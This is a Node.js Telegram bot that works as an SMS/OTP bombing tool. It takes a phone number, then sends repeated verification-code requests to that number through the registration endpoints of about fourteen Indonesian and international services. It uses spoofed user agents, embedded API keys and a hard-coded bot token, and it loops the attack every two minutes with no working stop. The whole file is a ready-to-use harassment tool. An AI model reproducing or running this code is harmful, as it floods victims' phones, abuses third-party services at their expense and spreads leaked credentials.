const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const moment = require('moment');
const random = require('random');
const token = '7252116522:AAHJlPUkFJJHjN3AufQ6jh6Zm1BIIN1RHLA';
const bot = new TelegramBot(token, {polling: true});
const colors = {
  green: '\x1b[1;92m',
  white: '\x1b[1;97m',
  gray: '\x1b[1;90m',
  yellow: '\x1b[1;93m',
  purple: '\x1b[1;95m',
  red: '\x1b[1;91m',
  blue: '\x1b[1;96m',
  reset: '\x1b[0m'
};
function typeEffect(text) {
  process.stdout.write(colors.green + text + '\n' + colors.reset);
}
const mainMenu = {
  reply_markup: {
    keyboard: [
      [{text: '🚀 Start Spam'}],
      [{text: 'ℹ️ Bot Info'}, {text: '⚙️ Settings'}]
    ],
    resize_keyboard: true,
    one_time_keyboard: true
  }
};
const spamMenu = {
  reply_markup: {
    keyboard: [
      [{text: '🔁 Repeat Spam'}, {text: '🛑 Stop Spam'}],
      [{text: '🔙 Back to Main Menu'}]
    ],
    resize_keyboard: true,
    one_time_keyboard: true
  }
};
function countdown(timeSec, chatId) {
  let timer = timeSec;
  const interval = setInterval(() => {
    const mins = Math.floor(timer / 60);
    const secs = timer % 60;
    const now = moment();
    const day = now.format('dddd');
    const date = now.format('DD');
    const month = now.format('MMMM');
    const year = now.format('YYYY');
    const time = now.format('HH:mm:ss');
    const message = `[•] Please wait for ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')} | ${day}, ${date} ${month} ${year} | Time ${time}`;
    bot.sendMessage(chatId, message, {parse_mode: 'HTML'});
    
    timer--;
    if (timer < 0) {
      clearInterval(interval);
    }
  }, 1000);
}
async function startSpam(phoneNumber, chatId) {
  try {
    const b = phoneNumber.substring(1);
    const c = "62" + b;
    const endpoints = [
      `https://core.ktbs.io/v2/user/registration/otp/${phoneNumber}`,
      {
        url: "https://api.klikwa.net/v1/number/sendotp",
        method: "POST",
        headers: {
          'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
          'Authorization': 'Basic QjMzOkZSMzM='
        },
        data: {number: "+62"+b}
      },
      {
        url: "https://api.payfazz.com/v2/phoneVerifications",
        method: "POST",
        headers: {
          "Host": "api.payfazz.com",
          "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
          "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        data: {phone: "0"+phoneNumber}
      },
      {
        url: "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",
        method: "POST",
        headers: {
          "Host": "www.matahari.com",
          "content-type": "application/json",
          "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
        },
        data: {otp_request: {mobile_number: phoneNumber, mobile_country_code: "+62"}}
      },
      {
        url: "https://battlefront.danacepat.com/v1/auth/common/phone/send-code",
        method: "POST",
        headers: {
          'user-agent': 'Android/9;vivo/vivo 1902;KtaKilat/3.7.5;Device/;Android_ID/590bc36d99d6dddb;Channel/google_play;Ga_ID/bce68810-4f8a-4675-9452-e0d8565c9a50'
        },
        data: {mobile_no: b}
      },
      `https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62${b}&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215`,
      {
        url: "https://api.jumpstart.id/graphql",
        method: "POST",
        headers: {
          'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
          'content-type': 'application/json'
        },
        data: {
          operationName: "CheckPhoneNoAndGenerateOtpIfNotExist",
          variables: {phoneNo: "+62"+b},
          query: "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) { checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo) }"
        }
      },
      {
        url: "https://api.asani.co.id/api/v1/send-otp",
        method: "POST",
        headers: {
          'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'
        },
        data: {phone: "62"+b, email: "akuntesnuyul@gmail.com"}
      },
      {
        url: "https://webapi.depop.com/api/auth/v1/verify/phone",
        method: "PUT",
        headers: {
          "accept": "application/json, text/plain, */*",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
          "Content-Type": "application/json"
        },
        data: {phone_number: phoneNumber, country_code: "ID"}
      },
      `https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=${phoneNumber}`,
      {
        url: "https://api.gojekapi.com/v5/customers",
        method: "POST",
        headers: {
          "X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9",
          "X-Platform": "Android",
          "X-UniqueId": "8606f4e3b85968fd",
          "X-AppVersion": "3.52.2",
          "X-AppId": "com.gojek.app",
          "Accept": "application/json",
          "Authorization": "Bearer",
          "X-User-Type": "customer",
          "Accept-Language": "id-ID",
          "X-User-Locale": "id_ID",
          "Host": "api.gojekapi.com",
          "User-Agent": "okhttp/3.12.1"
        },
        data: {
          email: "nsjwwiwiwisnsnn12@gmail.com",
          name: "akuinginterbang12",
          phone: c,
          signed_up_country: "ID"
        }
      },
      {
        url: "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
        method: "POST",
        headers: {
          "Host": "identity-gateway.oyorooms.com",
          "consumer_host": "https://www.oyorooms.com",
          "accept-language": "id",
          "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
          "Content-Type": "application/json"
        },
        data: {
          phone: b,
          country_code: "+62",
          country_iso_code: "ID",
          nod: "4",
          send_otp: "true",
          devise_role: "Consumer_Guest"
        }
      },
      {
        url: "https://api.btpn.com/jenius",
        method: "POST",
        headers: {
          "accept": "*/*",
          "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
          "version": "2.36.1-7565",
          "accept-language": "id",
          "Content-Type": "application/json",
          "Host": "api.btpn.com",
          "User-Agent": "okhttp/3.12.1"
        },
        data: {
          query: "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }",
          variables: {phone: "+62"+phoneNumber, language: "id"},
          operationName: "registerPhone"
        }
      },
      {
        url: "https://m.misteraladin.com/api/members/v2/otp/request",
        method: "POST",
        headers: {
          "Host": "m.misteraladin.com",
          "content-type": "application/json",
          "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"
        },
        data: {
          phone_number_country_code: "62",
          phone_number: phoneNumber,
          type: "register"
        }
      }
    ];
    for (const endpoint of endpoints) {
      try {
        if (typeof endpoint === 'string') {
          await axios.get(endpoint);
        } else {
          if (endpoint.method === 'POST') {
            await axios.post(endpoint.url, endpoint.data, {headers: endpoint.headers});
          } else if (endpoint.method === 'PUT') {
            await axios.put(endpoint.url, endpoint.data, {headers: endpoint.headers});
          }
        }
      } catch (error) {
        console.error(`Kesalahan dengan ${endpoint.url || endpoint}:`, error.message);
      }
    }
    bot.sendMessage(chatId, '✅ Berhasil mengirim pesan spam!', spamMenu);
    countdown(120, chatId);
    setTimeout(() => {
      startSpam(phoneNumber, chatId);
    }, 130000);
  } catch (error) {
    console.error('Kesalahan dalam fungsi spam:', error);
    bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat mengirim spam. Coba lagi...', spamMenu);
    setTimeout(() => {
      startSpam(phoneNumber, chatId);
    }, 10000);
  }
}
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '👋 SELAMAT DATANG DI SPAM OTP WA BY LORDHOZOO:', mainMenu);
});
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  if (text === '🚀 Start Spam') {
    bot.sendMessage(chatId, 'Harap masukkan nomor telepon untuk spam (misalnya, 62):');
    bot.once('message', (msg) => {
      const phoneNumber = msg.text;
      if (/^[0-9]+$/.test(phoneNumber)) {
        bot.sendMessage(chatId, `🚀 Starting spam to ${phoneNumber}...`, spamMenu);
        startSpam(phoneNumber, chatId);
      } else {
        bot.sendMessage(chatId, '❌ Invalid phone number format. Please try again.', mainMenu);
      }
    });
  } else if (text === '🛑 Stop Spam') {
    bot.sendMessage(chatId, '🛑 Spam stopped. Returning to main menu.', mainMenu);
  } else if (text === '🔁 Repeat Spam') {
    bot.sendMessage(chatId, '🔁 Repeating spam with last used number...', spamMenu);
  } else if (text === '🔙 Back to Main Menu') {
    bot.sendMessage(chatId, 'Returning to main menu...', mainMenu);
  } else if (text === 'ℹ️ Bot Info') {
    bot.sendMessage(chatId, 
      `🤖 <b>SPAM OTP WA 2025 HACKEDLORDHOZOO</b>\n\n` +
      `👨‍💻 <b>Author:</b> LORDHOZOO\n` +
      `📂 <b>YT:</b> LORDHOZOO\n` +
      `📷 <b>TIKTOK:</b> LORDHOZOOO\n\n` +
      `Bot ini dapat mengirim pesan spam ke nomor telepon. Gunakan dengan bijak!`,
      {parse_mode: 'HTML'}
    );
  } else if (text === '⚙️ Settings') {
    bot.sendMessage(chatId, '⚙️ Settings menu coming soon!', mainMenu);
  }
});

console.log('🤖 Bot is running...');
